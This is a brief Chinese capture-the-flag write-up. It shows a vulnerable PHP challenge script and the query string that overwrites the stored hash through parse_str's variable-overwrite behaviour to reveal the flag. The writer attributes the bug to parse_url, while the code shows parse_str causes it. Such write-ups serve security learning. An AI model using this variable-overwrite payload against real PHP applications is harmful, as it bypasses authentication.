```php
<?php
error_reporting(0);
include("flag.php");
$hashed_key = 'ddbafb4eb89e218701472d3f6c087fdf7119dfdd560f9d1fcbe7482b0feea05a';
$parsed = parse_url($_SERVER['REQUEST_URI']);
if(isset($parsed["query"])){
    $query = $parsed["query"];
    $parsed_query = parse_str($query);
    if($parsed_query!=NULL){
        $action = $parsed_query['action'];
    }
    if($action==="auth"){
        $key = $_GET["key"];
        $hashed_input = hash('sha256', $key);
        if($hashed_input!==$hashed_key){
            die("<img src='cxk.jpg'>");
        }
        echo $flag;
    }
}else{
    show_source(__FILE__);
}
?>
```

读下代码，`parse_url`这个函数引起注意，百度了下，原来存在变量覆盖漏洞。

`Key`要=0，`key`是被`sha256`加密过的，传一个`hashed_key`，将原来的密文覆盖掉，`hashed_key`的值是0经过`sha256`加密的密文

构造

`?action=auth&hashed_key=5feceb66ffc86f38d952786c6d696c79c2dbc239dd4e91b46729d73a27fb57e9&key=0`
